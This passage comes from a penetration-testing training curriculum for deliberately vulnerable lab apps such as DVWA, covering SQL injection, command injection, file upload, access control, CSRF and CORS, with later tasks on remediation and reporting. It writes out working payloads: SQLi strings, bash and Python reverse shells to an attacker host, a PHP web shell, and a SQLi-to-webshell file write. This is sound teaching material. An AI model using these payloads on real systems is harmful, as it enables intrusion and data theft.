| **Common Mistakes** | Not understanding WHY the single quote works (it closes the string literal in the SQL query, causing a syntax error or modifying the logic). Testing only `' OR 1=1--` without first confirming boolean injection (true/false). Not trying both single quotes AND double quotes (SQL dialect-dependent). |

---

### Task 6.2 — UNION-Based Data Extraction

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Use UNION SELECT to extract data from the database. First determine the number of columns using `ORDER BY`, then map column data types, then extract: database name, version, current user, table names, column names, and finally data (like user passwords). |
| **Skills Learned** | UNION-based injection methodology (column count → data type mapping → information_schema → data extraction), SQL information_schema database, column alignment requirements for UNION, systematic database enumeration. |
| **Tools Used** | Burp Repeater, DVWA SQLi module. Key payloads: `' ORDER BY 1--`, `' UNION SELECT 1,2--`, `' UNION SELECT database(),version()--`, `' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()--`. |
| **Expected Output** | Database name, version, and current user extracted. All table names listed. All column names from the users table listed. Username and password hash pairs extracted. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Step-by-step extraction sequence (each payload and its result). The complete query construction process. Extracted data (usernames and hashes). Notes on the `information_schema` database structure. |
| **Common Mistakes** | Not determining the correct column count first (UNION requires exact column match). Forgetting the comment terminator (`--` or `#`) to eliminate the rest of the original query. Not URL-encoding special characters when testing in the browser. Using `table_schema=database()` wrong — it limits results to the current database. |

---

### Task 6.3 — Blind SQL Injection (Boolean & Time-Based)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Extract data from a blind injection point where results are not directly displayed. Use boolean inference (true/false page changes) and time-based inference (response delay with `SLEEP()`) to extract data character by character. |
| **Skills Learned** | Blind injection techniques, boolean inference logic, time-based side channels, the `SUBSTRING()` function for character extraction, binary search optimization for faster extraction, understanding why blind SQLi is slower but equally dangerous. |
| **Tools Used** | Burp Repeater, DVWA SQLi (Blind) module. Boolean: `1' AND SUBSTRING(database(),1,1)='d' --`. Time: `1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0) --`. |
| **Expected Output** | Database name extracted character by character. Documentation of the inference process (which characters were tested, which produced true/false). Timing measurements for time-based injection. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The boolean inference sequence showing each character tested. Timing comparison (instant response = false, delayed response = true). Notes explaining how to optimize blind extraction (binary search on ASCII values instead of testing every letter). |
| **Common Mistakes** | Not being patient — blind extraction is slow by nature. Not using `SUBSTRING()` correctly (it's 1-indexed in MySQL). Confusing network latency with time-based true conditions (use a long enough SLEEP value, like 5 seconds). Not automating after understanding the manual process (blind SQLi by hand is a learning exercise; use sqlmap or scripts for efficiency). |

---

### Task 6.4 — sqlmap Comparison & Automation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Run `sqlmap` against the same injection points you tested manually. Compare the results, speed, and detection capabilities with your manual work. Understand sqlmap's key options and when automation is appropriate vs when manual testing is needed. |
| **Skills Learned** | sqlmap usage and configuration, reading sqlmap output, understanding sqlmap's detection techniques, when to use automation (time efficiency) vs manual testing (understanding and stealth), risk levels and tamper scripts. |
| **Tools Used** | `sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs`. |
| **Expected Output** | sqlmap output showing detected injection type, database enumeration, and data extraction. Side-by-side comparison with manual results (did sqlmap find more? less? the same?). |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | sqlmap command with all options used. sqlmap output summary. Comparison notes: manual vs automated results. Notes on sqlmap's `--risk` and `--level` options and tamper scripts. |
| **Common Mistakes** | Using sqlmap as the FIRST tool instead of confirming injection manually first. Forgetting to provide the session cookie (sqlmap gets redirected to login page and finds nothing). Not understanding sqlmap's output (it tells you the injection type, database, and technique — read it). Running sqlmap with default risk/level on sensitive systems (it can modify data with `--risk 3`). |

---

## Level 7: Command Injection

*Exploit input fields that interact with operating system commands.*

---

### Task 7.1 — Basic OS Command Injection

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Exploit the DVWA Command Injection module (Low security) to execute system commands. Understand how the application constructs the command string and where user input is concatenated. |
| **Skills Learned** | OS command injection mechanics, command chaining operators (`;`, `&&`, `||`, `|`), understanding the difference between each operator, how `system()`, `exec()`, `passthru()` functions work in PHP. |
| **Tools Used** | Browser, Burp Repeater, DVWA Command Injection module. Payloads: `; id`, `&& whoami`, `| cat /etc/passwd`. |
| **Expected Output** | System command output displayed alongside the normal ping output. Results of `id`, `whoami`, `ls`, `cat /etc/passwd`. Understanding of which user the web server runs as. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Each injection payload and the command output. View Source from DVWA showing the vulnerable PHP code. Notes on each chaining operator: `;` (always runs second command), `&&` (runs if first succeeds), `||` (runs if first fails), `|` (pipes first output to second). |
| **Common Mistakes** | Not trying all four operators (the application may filter some but not others). Not reading the DVWA source code to understand the vulnerable function (`shell_exec()`, `system()`, etc.). Not understanding the web server user context (you're executing as `www-data`, not root). |

---

### Task 7.2 — Command Injection Filter Bypass

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Bypass command injection filters at DVWA Medium and High security levels. Identify which characters or patterns are filtered and develop bypass techniques. |
| **Skills Learned** | Filter analysis methodology, bypass techniques (using `$IFS` instead of spaces, backtick substitution, newline injection `%0a`, using `${IFS}` for field separator), why blacklists for command injection are ineffective. |
| **Tools Used** | Burp Repeater, DVWA Command Injection at Medium/High. |
| **Expected Output** | For each security level: the filter identified (by reading DVWA source and by testing), the bypass payload, and the command output. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Filter bypass payloads for each security level. DVWA source code showing the filter logic. Notes on bypass techniques and when each is applicable. |
| **Common Mistakes** | Not reading the source code to understand what's being filtered (guessing is inefficient). Not trying alternative whitespace characters (`%09` tab, `${IFS}`). Not trying alternative command substitution (`` `command` `` vs `$(command)`). |

---

### Task 7.3 — Command Injection to Reverse Shell

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Escalate from simple command output injection to a full reverse shell connection. Set up a listener on your attacker machine and trigger a connection from the web server. |
| **Skills Learned** | Reverse shell mechanics, common reverse shell one-liners (bash, python, netcat, perl, php), listener setup, why reverse shells are preferred over bind shells (bypasses inbound firewall rules). |
| **Tools Used** | Listener: `nc -lvnp 4444`. Payload: `; bash -c 'bash -i >& /dev/tcp/<attacker>/4444 0>&1'` or `; python -c 'import socket,os,pty;s=socket.socket();s.connect(("<attacker>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`. |
| **Expected Output** | Interactive shell received on your listener running as the web server user. Output of `id`, `whoami`, `hostname`. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Listener terminal showing the incoming connection. Shell session demonstrating interactive command execution. The exact reverse shell one-liner that worked. Notes on why bash reverse shells sometimes fail (the target may not have bash, or `/dev/tcp` may not be available — have multiple one-liners ready). |
| **Common Mistakes** | Not starting the listener before injecting the payload. Using the target IP in the reverse shell command instead of the attacker IP. The target's version of netcat not supporting `-e` (use the bash `/dev/tcp` method instead). Firewall on the attacker machine blocking the incoming connection. |

---

## Level 8: File Upload Attacks

*Bypass file upload restrictions to execute code on the server.*

---

### Task 8.1 — Unrestricted File Upload

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Upload a PHP web shell through an unrestricted file upload function. Access the uploaded file via the web server to execute commands. Understand why unrestricted upload = remote code execution. |
| **Skills Learned** | Web shell concepts, file upload vulnerability mechanics, how web servers decide to execute files (based on extension + MIME type + handler configuration), why upload directories should never allow script execution. |
| **Tools Used** | DVWA File Upload (Low security) or WackoPicko. Web shell: `<?php system($_GET['cmd']); ?>` saved as `shell.php`. |
| **Expected Output** | Successful file upload. File accessible at its uploaded URL. Command execution via `?cmd=id`. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Upload request/response in Burp. Browser screenshot of command execution through the web shell. Notes on the minimal PHP web shell code and what each part does. |
| **Common Mistakes** | Not finding the uploaded file's URL (check the response for the path, or use the directory listing). Uploading a file that doesn't execute (wrong extension for the server's configuration). Not cleaning up uploaded shells after testing. |

---

### Task 8.2 — MIME Type & Extension Filter Bypass

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Bypass file upload restrictions at DVWA Medium/High security. Test techniques: Content-Type header modification, extension alternatives (`.php5`, `.phtml`, `.phar`), double extensions (`.php.jpg`), null byte injection in filename (`shell.php%00.jpg`). |
| **Skills Learned** | How upload filters work (client-side extension check, server-side Content-Type check, server-side extension check, magic byte validation), bypass techniques for each filter type, why defense-in-depth for uploads requires multiple validation layers. |
| **Tools Used** | Burp Intercept (modify Content-Type and filename in the upload request), DVWA File Upload at Medium/High. |
| **Expected Output** | For each security level: the filter identified, the bypass technique used, successful upload and execution proof. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Original and modified upload requests showing the bypass. Filter bypass matrix: Security Level → Filter Type → Bypass Technique → Result. DVWA source code showing the filter logic. |
| **Common Mistakes** | Only modifying the Content-Type header without changing the extension (or vice versa). Not checking if the server renames uploaded files (some filters rename to `.jpg` regardless). Not testing execution after a successful upload (the file may upload but not execute). |

---

### Task 8.3 — Magic Byte & Polyglot File Uploads

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Bypass magic byte validation (where the server checks file content, not just the extension/Content-Type). Create a polyglot file that is both a valid image and a PHP script. |
| **Skills Learned** | File magic bytes (file signatures), how `file` and `getimagesize()` determine file type, polyglot file construction, why content-based validation can be bypassed, defense recommendation (use separate execution-disabled upload domains). |
| **Tools Used** | `exiftool` (to embed PHP in image metadata), hex editor, `file` command. Polyglot approach: prepend `GIF89a;` to PHP code, or use `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`. |
| **Expected Output** | File that passes `getimagesize()` check AND executes as PHP. Command execution through the uploaded polyglot. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | Polyglot file creation commands. `file` command output showing the file is identified as an image. Execution proof. Notes on the defense: never allow script execution in upload directories (use `.htaccess` deny, separate domains, or object storage). |
| **Common Mistakes** | Corrupting the image format so `getimagesize()` still fails. Not understanding that the server needs to process the file as PHP (the extension or handler must trigger PHP execution). Not testing whether the web server actually executes the uploaded file or just serves it as binary data. |

---

# 🛡️ PHASE 4: ACCESS CONTROL & TRUST ABUSE

---

## Level 9: Access Control & Authorization (IDOR)

*Find and exploit broken access controls — the class of bug where the application lets you do things you shouldn't be allowed to do.*

---

### Task 9.1 — Horizontal IDOR: Accessing Other Users' Data

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Find parameters that reference user-specific resources by ID (e.g., `?user_id=1`, `?account=1234`, `?order_id=100`). Modify these values to access other users' data without authorization checks. |
| **Skills Learned** | IDOR (Insecure Direct Object Reference) concept, horizontal privilege escalation (same role, different user), predictable resource identifiers, how to systematically test for IDOR across an application, OWASP A01:2021 Broken Access Control. |
| **Tools Used** | Burp Repeater (modify ID parameters), Burp Intruder (enumerate IDs with number ranges), BodgeIt Store or WackoPicko. |
| **Expected Output** | Access to other users' personal data (profile, orders, messages) by modifying the ID parameter. Documentation showing at least three different resources accessed by changing the ID value. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Requests showing the ID parameter modification. Responses showing other users' data. Notes on the business impact (PII exposure, financial data access, privacy violation). |
| **Common Mistakes** | Only testing with sequential integers (some apps use UUIDs, but predictable UUIDs or enumerable endpoints still qualify). Not testing all parameters that could be object references (not just `?id=` — check POST bodies, headers, cookies, and JSON). Not documenting the business impact (IDOR for viewing invoices is different from IDOR for modifying account settings). |

---

### Task 9.2 — Vertical Privilege Escalation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | While logged in as a normal user, access administrative functions by directly browsing to admin URLs, modifying role parameters, or replaying admin-level requests. |
| **Skills Learned** | Vertical privilege escalation (lower role accessing higher role functions), forced browsing to admin panels, parameter-based role checks (e.g., `?admin=true`, `role=admin` in cookies), why authorization must be checked server-side on every request. |
| **Tools Used** | Burp Suite (capture admin requests, replay as normal user), browser (direct URL navigation), BodgeIt or Mutillidae. |
| **Expected Output** | Administrative actions performed from a low-privilege account. Documentation of the missing authorization check and the URL/parameter that bypassed it. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Admin URL accessed without admin credentials. Modified request showing role parameter tampering. Notes on the defense: authorization checks must happen on every server-side request, not just in the UI. |
| **Common Mistakes** | Assuming that hiding the admin link from the navigation is sufficient security (it's not — if the endpoint works without authorization, it's vulnerable). Only testing GET requests (admin POST actions like "delete user" or "change settings" are often unprotected). Not checking if the application uses role-based cookies or parameters that can be modified. |

---

### Task 9.3 — Forced Browsing & Hidden Endpoints

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Discover hidden or unlinked endpoints through directory brute-forcing, JavaScript source analysis, and robots.txt inspection. Access these endpoints without authentication. |
| **Skills Learned** | Forced browsing techniques, how applications rely on obscurity instead of authorization, JavaScript source code analysis for API endpoints, the value of robots.txt as an information source. |
| **Tools Used** | `gobuster dir -u http://<target>/<app>/ -w /usr/share/wordlists/dirb/common.txt`, browser Developer Tools (check JS files for API URLs), `curl http://<target>/robots.txt`. |
| **Expected Output** | List of discovered hidden endpoints. At least one endpoint that provides access to restricted functionality without authentication. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | Directory brute-force results. Interesting endpoints found in JavaScript source files. robots.txt contents. Notes on why security through obscurity is not security. |
| **Common Mistakes** | Using small wordlists that miss common paths. Not checking JavaScript files for hardcoded API URLs. Not testing discovered endpoints for authentication requirements (finding them is step 1; accessing them unauthorized is the vulnerability). |

---

## Level 10: CSRF, CORS & Client-Side Trust

*Exploit trust relationships between the browser, the user, and the application.*

---

### Task 10.1 — Cross-Site Request Forgery (CSRF) Exploitation

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Build a CSRF proof-of-concept HTML page that forces an authenticated victim's browser to perform a state-changing action (password change, email change, or profile update) without their knowledge. |
| **Skills Learned** | CSRF mechanics (the browser automatically includes cookies with requests to a domain — even from another domain's page), why same-origin policy doesn't prevent form submissions, how to identify CSRF-vulnerable requests (state-changing, no CSRF token, cookie-based auth). |
| **Tools Used** | Text editor (create HTML POC), Burp Suite (capture the target request, convert to auto-submitting form), DVWA CSRF module. |
| **Expected Output** | A standalone HTML file that, when opened by an authenticated user, automatically changes their DVWA password. Proof of the password change (log in with the new password). |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The CSRF POC HTML file. Before/after login screenshots (original password fails, attacker-set password works). Burp request showing the legitimate password change. Notes on the three CSRF prerequisites: (1) state-changing action, (2) cookie-based authentication, (3) no unpredictable request parameters. |
| **Common Mistakes** | Not making the form auto-submit (the POC should fire without the victim clicking anything — use `<body onload="document.forms[0].submit()">`). Not testing with a different browser/session (you need to prove it works for ANOTHER user). Not understanding that JSON-based APIs with Content-Type checks are harder to CSRF (HTML forms can't send `application/json`). |

---

### Task 10.2 — CSRF Token Analysis & Bypass

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify applications that implement CSRF tokens. Test if the protection can be bypassed by: removing the token entirely, using a blank value, using a token from a different session, or using a token from a different account. |
| **Skills Learned** | CSRF token validation models (tied to session vs global, single-use vs reusable), common implementation mistakes, why CSRF token validation must be server-side and strict, SameSite cookie attribute as a complementary defense. |
| **Tools Used** | Burp Repeater (modify/remove CSRF token parameters), Burp Proxy (compare tokens across sessions). |
| **Expected Output** | For each bypass technique tested: the result (bypassed or blocked), the evidence. Documentation of which validation model the application uses. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Each bypass attempt and its result. Notes on proper CSRF token implementation (tied to session, validated server-side, unpredictable, single-use). |
| **Common Mistakes** | Assuming CSRF tokens are always secure (many implementations are weak). Not testing token removal (some apps generate tokens but never validate them). Not testing cross-user token reuse (some apps use a global token that any valid token satisfies). |

---

### Task 10.3 — CORS Misconfiguration Testing

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Identify endpoints with CORS headers. Test for misconfigurations: reflecting arbitrary Origin headers, allowing `null` Origin, using wildcard `*` with credentials. |
| **Skills Learned** | CORS (Cross-Origin Resource Sharing) mechanics, same-origin policy, how CORS relaxes SOP, dangerous CORS configurations, the difference between simple and preflighted requests, how CORS misconfiguration enables cross-domain data theft. |
| **Tools Used** | `curl -H "Origin: http://evil.com" -v http://<target>/api/endpoint` (check for `Access-Control-Allow-Origin` in response), Burp Repeater. |
| **Expected Output** | CORS header analysis for tested endpoints. Any misconfigurations documented (Origin reflection, null Origin allowed, wildcard with credentials). |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Curl commands and responses showing CORS headers. Notes on why `Access-Control-Allow-Origin: *` is dangerous when combined with `Access-Control-Allow-Credentials: true` (allows any site to read authenticated responses). |
| **Common Mistakes** | Not understanding what CORS actually does (it doesn't prevent requests — it prevents the browser from reading cross-origin responses). Confusing CORS with CSRF (CORS protects data reading; CSRF exploits state-changing actions). Not testing with the `Origin` header (CORS headers only appear when an Origin header is sent). |

---

### Task 10.4 — HTTP Security Headers Audit

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Audit every BWA application for the presence and correctness of security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, and Permissions-Policy. |
| **Skills Learned** | Security header purposes and configurations, how missing headers enable specific attacks (no X-Frame-Options → clickjacking, no CSP → XSS is easier, no X-Content-Type-Options → MIME sniffing attacks), defense-in-depth via HTTP headers. |
| **Tools Used** | `curl -I http://<target>/<app>/`, Burp response headers, `securityheaders.com` (for reference). |
| **Expected Output** | Security header audit table: Application Name → each header → Present/Missing/Misconfigured → Attack Enabled. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | The complete security header audit table. Recommended header configurations for each missing header. Notes mapping each header to the attack it prevents. |
| **Common Mistakes** | Only checking the landing page (different paths may have different header configurations). Not understanding what each header does (listing them without understanding their purpose is pointless). Not providing specific recommended values in your findings (e.g., "Add `X-Frame-Options: DENY`" is better than "Add X-Frame-Options"). |

---

# 🏆 PHASE 5: CHAINING, DEFENSE & MASTERY

---

## Level 11: Application-Specific Deep Dives

*Master individual training applications by completing their full lesson tracks.*

---

### Task 11.1 — WebGoat Complete Course

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Complete all beginner and intermediate WebGoat lessons across injection, XSS, access control, authentication, session management, and web services categories. Write a one-line summary of the key lesson from each module. |
| **Skills Learned** | Guided vulnerability practice, understanding vulnerability mechanics through structured exercises, the full OWASP Top 10 category coverage. |
| **Tools Used** | Browser, Burp Suite, WebGoat application. |
| **Expected Output** | WebGoat progress page showing completed lessons. Your lesson summary document with one-line takeaways from each module. |
| **Difficulty** | ⭐⭐⭐ Intermediate |
| **Save These** | WebGoat completion screenshots. Your lesson summary document. Notes on which lessons were hardest and what concept finally clicked. |
| **Common Mistakes** | Rushing through lessons by looking at hints immediately. Not writing summaries (the act of summarizing forces understanding). Skipping the "why" sections and only doing the "how" exercises. |

---

### Task 11.2 — DVWA Full Coverage at Multiple Security Levels

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Complete every DVWA module (Brute Force, Command Injection, CSRF, File Inclusion, File Upload, SQL Injection, SQL Injection Blind, XSS Reflected, XSS Stored, Weak Session IDs) at Low, Medium, and High security levels. Document the filter/defense added at each level. |
| **Skills Learned** | Progressive difficulty testing, filter bypass methodology, understanding defensive code by reading DVWA source, comparing security implementations across difficulty levels. |
| **Tools Used** | Browser, Burp Suite, DVWA at all security levels. |
| **Expected Output** | Completion matrix: Module × Security Level → Payload Used → Result. For each Medium/High level: what defense was added and how you bypassed it. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The complete DVWA completion matrix. Source code annotations showing the filter at each security level. Your favorite bypass for each module. |
| **Common Mistakes** | Only testing at Low security (this teaches exploitation but not bypass skills). Not reading the source code (DVWA's "View Source" button is the most valuable learning tool in the application). Not attempting the Impossible level (it shows you the correct defense — study it even if you can't bypass it). |

---

### Task 11.3 — Mutillidae OWASP Top 10 Coverage

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Complete at least 5 different vulnerability categories in Mutillidae: injection (SQL, command, LDAP, XML), XSS, IDOR, authentication flaws, and information disclosure. Mutillidae offers a more realistic interface than DVWA. |
| **Skills Learned** | Testing realistic (non-guided) applications, discovering vulnerabilities without hints, applying techniques learned in DVWA to a different application context. |
| **Tools Used** | Browser, Burp Suite, Mutillidae application. |
| **Expected Output** | At least 5 documented findings across different OWASP Top 10 categories. For each: vulnerability, location, payload, evidence, and remediation. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | Documented findings with evidence. Notes comparing the Mutillidae testing experience with DVWA (less guided, more realistic). |
| **Common Mistakes** | Applying DVWA payloads without adapting them (different applications have different input handling). Only testing the pages explicitly labeled as vulnerable (Mutillidae has vulnerabilities in unexpected places too). Not trying LDAP and XML injection (these are available in Mutillidae but not DVWA). |

---

## Level 12: Vulnerability Chaining

*Combine multiple individual vulnerabilities into high-impact attack chains. This is where real-world pentesting skill is demonstrated.*

---

### Task 12.1 — XSS to Session Hijacking

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Chain a stored XSS vulnerability with a session cookie exfiltration payload to steal an administrator's session. Use the stolen cookie to impersonate the admin without knowing their password. |
| **Skills Learned** | Attack chaining methodology, session hijacking via cookie theft, why HttpOnly cookies block this chain, the full impact demonstration of XSS (it's not just `alert(1)`). |
| **Tools Used** | Stored XSS injection point, cookie exfiltration payload (Task 4.2), `nc` or Python HTTP listener, Cookie Editor (to inject stolen cookie into your browser). |
| **Expected Output** | Stolen session cookie received by your listener. Your browser session switched to the victim's authenticated session (verified by accessing admin-only pages). |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The complete chain: injection → exfiltration → session hijacking → admin access. Each step documented with evidence. Notes on what would break this chain (HttpOnly flag, CSP, session binding to IP). |
| **Common Mistakes** | Not testing with a different browser or session for the victim (you can't steal your own cookie and call it session hijacking). Not demonstrating the impact (access admin functions, not just "I have the cookie"). |

---

### Task 12.2 — SQL Injection to Remote Code Execution

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Chain a SQL injection vulnerability to achieve code execution on the server. Use MySQL's `INTO OUTFILE` to write a PHP web shell to the web directory, then access it via the browser. |
| **Skills Learned** | SQLi-to-RCE chaining, MySQL `INTO OUTFILE` for file writing, web root path discovery, why the MySQL user needs FILE privilege and the write directory needs correct permissions, alternative SQLi-to-RCE paths (UDF, xp_cmdshell for MSSQL). |
| **Tools Used** | Burp Repeater, SQLi injection point. Payload: `' UNION SELECT '<?php system($_GET["cmd"]); ?>', null INTO OUTFILE '/var/www/<path>/shell.php' --`. |
| **Expected Output** | PHP web shell written to the web directory via SQLi. Command execution through the web shell. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | The complete chain: SQLi → file write → web shell → command execution. Notes on prerequisites (FILE privilege, writable directory, known web root path). |
| **Common Mistakes** | Not knowing the web root path (use error messages, LFI, or `@@datadir` to discover it). MySQL user lacking FILE privilege (check with `SELECT file_priv FROM mysql.user`). Web directory not writable by the MySQL process. Writing to a path that isn't served by the web server. |

---

### Task 12.3 — IDOR to Account Takeover

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Chain an IDOR vulnerability with an insecure password reset or profile update function to take over another user's account. Demonstrate full account takeover impact. |
| **Skills Learned** | Business logic chaining, how IDOR becomes critical when combined with state-changing functions, attack impact escalation, demonstrating business impact vs technical impact. |
| **Tools Used** | Burp Repeater, BodgeIt or WackoPicko application. |
| **Expected Output** | Account takeover demonstrated: modify another user's password or email via IDOR, then log in as that user. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | The complete takeover chain with evidence. Before/after states showing the account change. Login proof as the compromised user. |
| **Common Mistakes** | Not escalating the IDOR impact (reading data is lower severity than modifying it — demonstrate the worst case). Not documenting the business impact (account takeover has compliance, legal, and reputational implications). |

---

### Task 12.4 — Multi-Bug Chain Diagram

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Create a visual diagram showing at least three different multi-vulnerability attack chains you've discovered. Each chain should show: entry vulnerability → escalation step → impact achieved. |
| **Skills Learned** | Attack path visualization, communicating chained risks to stakeholders, understanding that individual "medium" findings combine into "critical" chains, kill chain thinking. |
| **Tools Used** | Draw.io, Excalidraw, or Mermaid diagrams. |
| **Expected Output** | A professional attack chain diagram with at least three chains. Each chain annotated with: vulnerability class, OWASP category, and business impact. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The attack chain diagram (portfolio piece). Notes on which chains had the highest impact and why. |
| **Common Mistakes** | Only showing the successful path (include alternatives and dead ends). Not annotating business impact (technical chains need business context for reports). Making the diagram too complex to read (clarity over completeness). |

---

## Level 13: Defense, Remediation & Professional Mastery

*Switch perspectives. Become the defender. Then prove your mastery under exam conditions.*

---

### Task 13.1 — Secure Code Remediation for Every Vulnerability Class

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Write secure code fixes for each vulnerability class exploited in this curriculum: XSS (output encoding), SQLi (parameterized queries), Command Injection (input validation + avoiding shell calls), LFI (allowlist), File Upload (extension + content + separate domain), CSRF (token + SameSite), IDOR (authorization checks). |
| **Skills Learned** | Secure coding practices, the correct defense for each vulnerability class (not just "sanitize input"), understanding why each defense works at the technical level, defense-in-depth. |
| **Tools Used** | Code editor, DVWA's "View Source" (Impossible level) as reference implementations. |
| **Expected Output** | A secure coding reference document with: Vulnerability Class → Root Cause → Correct Defense → Code Example (PHP). At least 7 entries covering the major vulnerability classes. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The complete secure coding reference document. DVWA Impossible-level source code annotations showing the correct implementation. Notes on common "fixes" that don't actually work (e.g., blacklisting for XSS, escaping for SQLi instead of parameterization). |
| **Common Mistakes** | Recommending "input validation" for XSS (the correct fix is output encoding — validation helps but encoding is essential). Recommending "escaping" for SQLi (the correct fix is parameterized queries/prepared statements). Not providing code examples (abstract recommendations without code are useless to developers). |

---

### Task 13.2 — Apache Security Hardening Configuration

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Write a hardened Apache configuration that mitigates the server-level issues found during testing: security headers, directory listing disabled, server version hidden, upload directory execution disabled, proper TLS configuration. |
| **Skills Learned** | Apache security configuration, `.htaccess` usage, `ServerTokens`/`ServerSignature` for version hiding, security header configuration, disabling script execution in upload directories, TLS best practices. |
| **Tools Used** | Apache configuration files, `apachectl configtest` for syntax validation. |
| **Expected Output** | A complete hardened Apache configuration file with comments explaining each directive. Before/after header comparison showing improvements. |
| **Difficulty** | ⭐⭐⭐⭐ Intermediate-Advanced |
| **Save These** | The hardened configuration file. Before/after security header scans. Notes on each hardening directive and the attack it prevents. |
| **Common Mistakes** | Not testing the configuration (`apachectl configtest` catches syntax errors before restarting Apache). Setting security headers that break application functionality (test incrementally). Forgetting to disable execution in the upload directory (this is the most critical file upload defense). |

---

### Task 13.3 — Time-Boxed Assessment (90 Minutes, No Guides)

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Choose one BWA application you haven't focused on (BodgeIt, WackoPicko, or another). Set a strict 90-minute timer. Perform a complete web application assessment without referencing walkthroughs, hints, or your previous notes. Document every finding. |
| **Skills Learned** | Time management under pressure, methodical testing without guidance, realistic assessment simulation, discovering your knowledge gaps, building confidence for real engagements and certifications. |
| **Tools Used** | Your full toolkit, a timer, your assessment methodology. |
| **Expected Output** | Assessment notes written during the 90 minutes. Post-assessment analysis: what you found, what you missed, where you spent too much time, and what you would do differently. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | Raw assessment notes (warts and all). Post-assessment reflection document. Time allocation breakdown (how many minutes on recon vs testing vs documentation). |
| **Common Mistakes** | Spending too long on reconnaissance without testing. Going deep on one vulnerability and running out of time for others. Not taking notes during the assessment (you can't write the report without notes). Panicking when the first technique doesn't work instead of moving on. |

---

### Task 13.4 — Professional Web Application Penetration Test Report

- [ ] **Completed**

| Field | Detail |
|:---|:---|
| **Objective** | Write a professional-grade penetration test report for your 90-minute assessment. Follow industry-standard structure: Executive Summary, Scope & Methodology, Findings (with CVSS scores, evidence, impact, remediation), and Appendices. |
| **Skills Learned** | Professional report writing, executive vs technical communication, CVSS v3.1 scoring, evidence presentation, risk-based finding prioritization, the skill that separates junior from senior pentesters. |
| **Tools Used** | Markdown/Word editor, CVSS Calculator (first.org/cvss), your assessment notes and screenshots. |
| **Expected Output** | A complete penetration test report (8+ pages) including: executive summary (1 page, non-technical), methodology description, at least 5 findings with CVSS scores, evidence for each, prioritized remediation, and appendices with raw tool output. |
| **Difficulty** | ⭐⭐⭐⭐⭐ Advanced |
| **Save These** | The complete report (this is your most important portfolio piece). Notes on the report writing process and what was hardest. |
| **Common Mistakes** | Writing a blog post instead of a professional report. Using jargon in the executive summary (it's for business leaders, not engineers). Not including evidence for every finding (unproven findings get dismissed). Listing findings alphabetically instead of by risk rating (always put critical findings first). Not proofreading (typos undermine credibility). |

---

## ✅ Completion Checklist

| Phase | Status |
|:---|:---:|
